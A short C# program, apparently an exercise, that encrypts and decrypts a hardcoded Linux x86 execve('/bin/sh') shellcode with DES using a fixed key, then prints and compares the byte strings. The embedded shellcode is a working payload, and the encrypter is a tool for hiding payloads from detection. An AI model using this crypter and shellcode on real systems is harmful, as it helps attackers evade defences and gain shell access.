// C# shellcode encrypter using DES 
//
// Build command:
//     mcs encrypter.cs 
//
// Author: Oleg Mitrofanov (reider-roque) 2015

using System;
using System.Security.Cryptography;
using System.Text;
using System.Linq;

class MainClass
{
	private static String shellcodeStr = "\x31\xc9\xf7\xe1\x51\x68\x6e\x2f\x73\x68" +
		"\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";
	private static Byte[] key = new Byte[8] {1, 2, 3, 4, 5, 6, 7, 8};
	private static Byte[] iv = new Byte[8] {1, 2, 3, 4, 5, 6, 7, 8};


	private static void Main(string[] args)
	{
		Byte[] shellcodeBytes = ToShellcodeBytes(shellcodeStr);
		Byte[] shellcodeBytesEncrypted = Crypt(shellcodeBytes);
		String shellcodeStrEncrypted = ToShellcodeString(shellcodeBytesEncrypted);
		Byte[] shellcodeBytesDecrypted = Decrypt(shellcodeBytesEncrypted);
		String shellcodeStrDecrypted = ToShellcodeString(shellcodeBytesDecrypted);

		Console.WriteLine(
			"Original Shellcode ({0} bytes): {1}\n", 
			shellcodeStr.Length, 
			ToShellcodeString(ToShellcodeBytes(shellcodeStr)));
		Console.WriteLine(
			"Encrypted Shellcode ({0} bytes): {1}\n", 
			shellcodeBytesEncrypted.Length,
			shellcodeStrEncrypted);
		Console.WriteLine(
			"Decrypted Shellcode ({0} bytes): {1}\n", 
			shellcodeBytesDecrypted.Length,
			shellcodeStrDecrypted);

		if (shellcodeBytes.SequenceEqual(shellcodeBytesDecrypted)) 
		{
			Console.WriteLine("Success: Original and Decrypted shelcodes match.");
		}
		else 
		{
			Console.WriteLine("Fail: Original and Decrypted shellcodes do NOT match!");
		}
	}

	private static Byte[] Crypt(Byte[] inputBuffer)
	{
		SymmetricAlgorithm algorithm = DES.Create();
		ICryptoTransform transform = algorithm.CreateEncryptor(key, iv);
		Byte[] outputBuffer = transform.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
		//return Convert.ToBase64String(outputBuffer);
		return outputBuffer;
	}

	public static Byte[] Decrypt(Byte[] inputBuffer)
	{
		SymmetricAlgorithm algorithm = DES.Create();
		ICryptoTransform transform = algorithm.CreateDecryptor(key, iv);
		Byte[] outputBuffer = transform.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);

		return outputBuffer;
	}

	private static Byte[] ToShellcodeBytes(String shellcode)
	{
		Byte[] sc_bytes = new Byte[shellcode.Length];
		for (Int32 i = 0; i < shellcode.Length; i++) 
		{
			sc_bytes [i] = (Byte) shellcode [i];
		}

		return sc_bytes;
	}

	private static String ToShellcodeString(Byte[] shellcodeBytes)
	{
		StringBuilder shellcodeStr = new StringBuilder ();

		for (Int32 i = 0; i < shellcodeBytes.Length; i++) 
		{
			shellcodeStr.Append("\\x");
			shellcodeStr.Append(shellcodeBytes [i].ToString("X2"));
		}

		return shellcodeStr.ToString();
	}


}


